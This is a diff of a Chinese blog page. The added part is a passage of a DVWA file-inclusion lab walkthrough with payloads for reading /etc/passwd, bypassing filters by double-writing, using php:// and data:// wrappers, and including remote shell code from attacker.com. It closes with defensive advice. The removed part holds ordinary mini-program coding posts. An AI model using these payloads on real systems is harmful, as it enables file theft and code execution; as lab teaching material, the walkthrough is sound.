+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>或者用相对路径跳目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>还能读 Apache 配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>
+
+<p>PHP 配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/php/7.4/apache2/php.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h3><p>如果 PHP 配置了 <code>allow_url_include = On</code>，那就能包含远程文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>直接把远程的恶意代码包含进来执行，想想就刺激。</p>
+<h3 id="配合文件上传"><a href="#配合文件上传" class="headerlink" title="配合文件上传"></a>配合文件上传</h3><p>如果还有文件上传漏洞，可以上传一个含恶意代码的图片，然后用文件包含去执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../hackable/uploads/malicious.jpg</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 开始过滤了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>, <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\\&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>，但是用 <code>str_replace</code> 这种方式很容易绕。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>双写绕过目录遍历：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=....//....//....//....//etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>过滤完 <code>../</code> 之后，剩下的 <code>../</code> 就拼出来了。</p>
+<p><strong>双写绕过远程包含：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=hthttp://tp://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>过滤完 <code>http://</code> 就变成了 <code>http://attacker.com/shell.txt</code>。</p>
+<p><strong>用其他协议：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=ftp://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP 伪协议：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>这个还能把文件内容 base64 编码输出，读源码很好用。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别限制了文件名必须以 <code>file</code> 开头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// 拒绝访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是 <code>file://</code> 协议也符合这个条件啊。</p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>用 <code>file://</code> 协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>虽然限制了文件名格式，但 <code>file://</code> 协议能读任意本地文件，过滤了个寂寞。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用了白名单：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="variable">$allowed_files</span> = <span class="keyword">array</span>( <span class="string">&#x27;file1.php&#x27;</span>, <span class="string">&#x27;file2.php&#x27;</span>, <span class="string">&#x27;file3.php&#x27;</span> );</span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">in_array</span>( <span class="variable">$file</span>, <span class="variable">$allowed_files</span> ) ) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;include.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>( <span class="variable">$file</span> );</span><br></pre></td></tr></table></figure>
+
+<p>只有在白名单里的文件才能包含，这才是正确的做法。</p>
+<h2 id="常用-Payload-速查"><a href="#常用-Payload-速查" class="headerlink" title="常用 Payload 速查"></a>常用 Payload 速查</h2><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>?page=/etc/passwd</code></td>
+<td>读 Linux 用户文件</td>
+</tr>
+<tr>
+<td><code>?page=../../../../../etc/passwd</code></td>
+<td>目录遍历</td>
+</tr>
+<tr>
+<td><code>?page=php://filter/read=convert.base64-encode/resource=config.php</code></td>
+<td>读 PHP 源码</td>
+</tr>
+<tr>
+<td><code>?page=php://input</code></td>
+<td>执行 POST 数据中的代码</td>
+</tr>
+<tr>
+<td><code>?page=file:///etc/passwd</code></td>
+<td>file 协议读本地文件</td>
+</tr>
+<tr>
+<td><code>?page=http://attacker.com/shell.txt</code></td>
+<td>远程文件包含</td>
+</tr>
+<tr>
+<td><code>?page=data://text/plain,&lt;?php phpinfo();?&gt;</code></td>
+<td>data 协议执行代码</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>文件包含漏洞危害很大，防护要点：</p>
+<ol>
+<li>用白名单限制可包含的文件</li>
+<li>禁用远程文件包含 <code>allow_url_include = Off</code></li>
+<li>用 <code>open_basedir</code> 限制 PHP 能访问的目录</li>
+<li>过滤特殊字符虽然有用，但不如白名单靠谱</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1057,233 +1621,6 @@
 <p>参数： -m 2500为破解的模式为WPA&#x2F;PSK方式  hccap格式的文件是刚刚转化好的文件  字典文件 </p>
 <p>注：最新版hashcat一般情况下不支持hccap格式，第一步需将握手包cap格式转换为hccapx</p>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/18/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/01/18/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">小程序之模型实现 </a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-01-18 00:33:00" itemprop="dateCreated datePublished" datetime="2020-01-18T00:33:00+08:00">2020-01-18</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>model层就不用多说了，主要是把数据处理部分独立出来，便于统一服务和维护，这里重点强调下model内部的实现细节，这里有一个实现技巧可以用在其它别的地方。下面直接上代码部分。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cache <span class="keyword">from</span> <span class="string">&#x27;../utils/cache.js&#x27;</span></span><br><span class="line"><span class="keyword">import</span> ajax <span class="keyword">from</span> <span class="string">&#x27;../utils/ajax.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统一的接口地址，一般一个controller下面多个action是一致的</span></span><br><span class="line"><span class="keyword">let</span> url = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 格式化请求参数，根据不同的接口自行处理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params</span> params 键值对对象,形如&#123;&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">*</span>&#125; 格式化后的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> formatParams = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 格式化返回结果，根据不同的接口自行处理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params</span> data 对象 数组等任何合法的JS数据类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">*</span>&#125; 格式化后的数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> formatResult = <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 读取可用游戏业务列表</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@params</span> params 参数,本接口用不到</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> &#123;<span class="type">*</span>&#125; 返回 Promise 对象</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">getList</span>(<span class="params">params</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果接口地址不一致，这里重写</span></span><br><span class="line">    <span class="keyword">let</span> url = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果有特殊的参数处理逻辑，这里重写</span></span><br><span class="line">    <span class="keyword">let</span> formatParams = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果有特殊的格式处理，这里重写</span></span><br><span class="line">    <span class="keyword">let</span> formatResult = <span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 如果需要自己先判断缓存或者别的处理，这里手动使用Promise封装一下即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> goods_list = cache.<span class="title function_">get</span>(<span class="string">&quot;goods_list&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">null</span> == goods_list) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(goods_list)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ajax.<span class="title function_">get</span>(&#123;</span><br><span class="line">          <span class="attr">url</span>: url,</span><br><span class="line">          <span class="attr">data</span>: <span class="title function_">formatParams</span>(params),</span><br><span class="line">          <span class="attr">login</span>: <span class="literal">false</span>,</span><br><span class="line">          <span class="attr">loading</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> data = <span class="title function_">formatResult</span>(res.<span class="property">data</span>)</span><br><span class="line">          cache.<span class="title function_">set</span>(<span class="string">&quot;goods_list&quot;</span>, data, <span class="number">86400</span>)</span><br><span class="line">          <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> goods <span class="keyword">from</span> <span class="string">&#x27;../../models/goods.js&#x27;</span></span><br><span class="line"></span><br><span class="line">goods.<span class="title function_">getList</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功&quot;</span>, res)</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;失败&quot;</span>, error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>把参数处理和返回结果处理拆出来放到单独的处理方法里，方法名称保持统一： <code>formatParams</code> ， <code>formatResult</code> </li>
-<li>同时最外层定义好默认的 <code>formatParams</code> ， <code>formatResult</code> ，如果不做特殊处理，直接使用默认即可（建议不处理也调用下默认方法，规范流程）</li>
-<li>还有一点，model里方法命令有统一规范都是已 <code>get</code> ， <code>add</code> ， <code>update</code> ， <code>del</code> 开头</li>
-</ol>
-<p>这个思路其实可以运用到任何场景，特别是在没有任何限定框架的场景，我们只需要按照这个模式去实现，代码一样很清晰漂亮。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E7%BC%93%E5%AD%98%E7%B1%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/01/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E7%BC%93%E5%AD%98%E7%B1%BB/" class="post-title-link" itemprop="url">小程序之缓存类 </a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-01-17 00:33:03" itemprop="dateCreated datePublished" datetime="2020-01-17T00:33:03+08:00">2020-01-17</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>其实，小程序自带了缓存接口，有同步 <code>wx.setStorageSync</code> ，异步 <code>wx.setStorage</code> 的方法，但是实际在使用缓存的场景里，我们一般都是需要设置缓存有效时间的，本cache工具就是对小程序缓存接口的封装，实现了对缓存有效期的支持。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">test</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      wx.<span class="title function_">setStorageSync</span>(<span class="string">&quot;JDC_TEST&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      wx.<span class="title function_">removeStorageSync</span>(<span class="string">&quot;JDC_TEST&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      wx.<span class="title function_">showModal</span>(&#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;提示&quot;</span>,</span><br><span class="line">        <span class="attr">content</span>: <span class="string">&quot;小程序缓存出现问题,请稍后使用&quot;</span>,</span><br><span class="line">        <span class="attr">showCancel</span>: !<span class="number">1</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(e.<span class="property">confirm</span>)&#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户点击确定&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">name, value, expire</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> expire == <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">      expire = expire * <span class="number">1e3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      expire = <span class="number">2592e5</span></span><br><span class="line">    &#125;</span><br><span class="line">    wx.<span class="title function_">removeStorageSync</span>(name);</span><br><span class="line">    <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      wx.<span class="title function_">setStorageSync</span>(name, &#123;</span><br><span class="line">        <span class="attr">_value</span>: value,</span><br><span class="line">        <span class="attr">_time</span>: time,</span><br><span class="line">        <span class="attr">_age</span>: time + expire</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="title function_">_isExpire</span>(name);</span><br><span class="line">    <span class="keyword">if</span> (data !== <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> data.<span class="property">_value</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">del</span>: <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      wx.<span class="title function_">removeStorageSync</span>(name);</span><br><span class="line">      <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">_isExpire</span>: <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = wx.<span class="title function_">getStorageSync</span>(name);</span><br><span class="line">    <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">if</span> (data &amp;&amp; time &lt; data.<span class="property">_age</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cache <span class="keyword">from</span> <span class="string">&#x27;../utils/cache.js&#x27;</span></span><br><span class="line"></span><br><span class="line">cache.<span class="title function_">set</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>,<span class="number">7200</span>);</span><br><span class="line">cache.<span class="title function_">get</span>(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">cache.<span class="title function_">del</span>(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/16/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%B0%81%E8%A3%85%E8%AF%B7%E6%B1%82/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/01/16/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%B0%81%E8%A3%85%E8%AF%B7%E6%B1%82/" class="post-title-link" itemprop="url">小程序之封装请求 </a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-01-16 00:33:03" itemprop="dateCreated datePublished" datetime="2020-01-16T00:33:03+08:00">2020-01-16</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>实现了 promise 的封装，支持GET、POST、PUT 和DELELE这里设计的时候就确定为仅满足单项目通用即可，所以实现的时候融入了部分业务层面的逻辑：</p>
-<ul>
-<li>接口首次格式化，兼容标准的json和var形式接口（内部有大量var形式的接口）</li>
-<li>直判断返回值在逻辑上是成功还是失败</li>
-<li>针对返回未登录的情况，自动跳转登录流程</li>
-</ul>
-<p>所以省去了业务调用侧的反复判断处理通用逻辑，使用更简洁。</p>
